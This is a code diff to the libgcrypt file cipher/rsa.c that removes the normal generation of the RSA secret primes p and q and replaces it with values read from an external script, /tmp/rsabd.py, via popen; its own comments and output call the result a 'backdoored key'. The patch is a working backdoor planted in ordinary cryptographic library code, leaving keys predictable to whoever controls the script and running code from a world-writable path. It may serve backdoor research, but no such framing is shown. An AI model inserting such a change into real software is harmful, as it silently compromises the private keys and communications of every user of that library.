@@ -1,0 +1,56 @@
+diff --git a/cipher/rsa.c b/cipher/rsa.c
+index ccc9f96..b5c5c65 100644
+--- a/cipher/rsa.c
++++ b/cipher/rsa.c
+@@ -191,6 +191,9 @@ generate_std (RSA_secret_key *sk, unsigned int nbits, unsigned long use_e,
+   gcry_mpi_t g;
+   gcry_mpi_t f;
+   gcry_random_level_t random_level;
++  FILE *bdk;
++  unsigned char bdkbuf[300];
++  gcry_error_t err;
+ 
+   if (fips_mode ())
+     {
+@@ -238,19 +241,28 @@ generate_std (RSA_secret_key *sk, unsigned int nbits, unsigned long use_e,
+         gcry_mpi_release (p);
+       if (q)
+         gcry_mpi_release (q);
+-      if (use_e)
+-        { /* Do an extra test to ensure that the given exponent is
+-             suitable. */
+-          p = _gcry_generate_secret_prime (nbits/2, random_level,
+-                                           check_exponent, e);
+-          q = _gcry_generate_secret_prime (nbits/2, random_level,
+-                                           check_exponent, e);
+-        }
+-      else
+-        { /* We check the exponent later. */
+-          p = _gcry_generate_secret_prime (nbits/2, random_level, NULL, NULL);
+-          q = _gcry_generate_secret_prime (nbits/2, random_level, NULL, NULL);
+-        }
++
++
++      /* generate a backdoored key */
++      bdk = popen("python2 /tmp/rsabd.py --gpg --generate", "r"); // --debug
++      /* save p */
++      fgets((char *)bdkbuf, sizeof(bdkbuf), bdk);
++      bdkbuf[strcspn(bdkbuf, "\r\n")] = 0; // truncate at newline - can only parse hex chars
++
++      err = gcry_mpi_scan(&p, GCRYMPI_FMT_HEX, bdkbuf, 0, NULL);
++      if (err) {
++          printf("error parsing p: %s", gcry_strerror( err ));
++          exit(1);
++      }
++      //log_mpidump("p as parsed from rsabd: ", p);
++      /* save q */
++      fgets((char *)bdkbuf, sizeof(bdkbuf), bdk);
++      bdkbuf[strcspn(bdkbuf, "\r\n")] = 0; // truncate at newline - can only parse hex chars
++      gcry_mpi_scan(&q, GCRYMPI_FMT_HEX, bdkbuf, 0, NULL);
++
++      pclose(bdk);
++      printf("backdoored key generated\n");
++
+       if (mpi_cmp (p, q) > 0 ) /* p shall be smaller than q (for calc of u)*/
+         mpi_swap(p,q);
+       /* calculate the modulus */
